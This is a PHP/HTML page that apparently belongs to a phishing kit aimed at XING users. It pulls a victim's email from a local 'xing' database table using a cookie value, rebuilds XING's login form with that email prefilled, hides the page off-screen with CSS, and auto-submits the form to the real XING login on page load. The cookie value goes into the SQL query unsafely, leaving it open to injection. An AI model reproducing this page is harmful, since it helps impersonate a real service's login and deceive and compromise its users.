<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `xing` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["xing"].submit();}</script>



<form accept-charset="UTF-8" action="https://login.xing.com/login" method="post" id="xing">

<input name="utf8" type="hidden" value="✓">
<input name="logged_out_sid" type="hidden" value="b2217511b4f421f2d166152f2de8196c">
<input name="locale" type="hidden" value="en">
<input name="login_form[dest_url]" type="hidden" value="https://www.xing.com/app/user?op=login;dest=%2f">
<input name="login_form[section]" type="hidden" value="core">
<input name="login_form[token_param]" type="hidden" value="auth_token">

<fieldset>

<label class="login-user">
Email
<br>
<input class="text" name="login_form[username]" maxlength="80" tabindex="1" type="text" autofocus="" value="<?=$email;?>">
</label>
<label class="login-perm">
<input name="login_form[perm]" type="hidden" value="0">
<input name="login_form[perm]" tabindex="3" type="checkbox" value="1">
Remember login
</label>

</fieldset>
<fieldset>

<label class="login-pass">
Password
<br>
<input class="text" name="login_form[password]" maxlength="80" tabindex="2" type="password" data-preloader="">
<a href="/app/user?op=lostpassword" class="lost-password" tabindex="5">Forgot your password?</a>
</label>

</fieldset>
<button class="button-gray" tabindex="4" type="submit">Log in</button>
</form>



</body>
</html>

